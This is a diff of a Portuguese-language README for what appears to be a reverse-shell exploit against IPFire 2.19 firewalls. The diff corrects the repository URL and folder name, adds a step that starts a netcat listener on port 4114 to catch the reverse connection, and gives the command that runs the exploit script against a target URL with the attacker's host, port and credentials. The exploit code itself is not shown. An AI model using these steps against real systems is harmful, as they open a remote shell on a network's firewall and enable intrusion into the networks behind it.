@@ -18,12 +18,20 @@ Para usar o script, siga as instruções abaixo:
 1. Clone o repositório:
 
    ```bash
-   git clone [https://github.com/seu-usuario/ipfire-reverse-shell-exploit.git](https://github.com/BrotherOfJhonny/IPFire_2.19.git)
+   git clone https://github.com/BrotherOfJhonny/IPFire_2.19.git
 
 2. Acesse a pasta:
-cd ipfire-reverse-shell-exploit
+ ``
+cd IPFire_2.19
+ ``
 
-3. Execute seguindo as intruções:
+4. Em outro terminal execute o netcat com os dados da porta que irá receber a conexão reversa.
+
+ ```bash
+nc -lvnp 4114
+ ```
+
+5. Execute seguindo as intruções:
 
   ```bash
 python ipfireExpl3.py --revhost SEU_HOST --revport SUA_PORTA --url URL_VULNERAVEL --u SEU_USUARIO --p SUA_SENHA
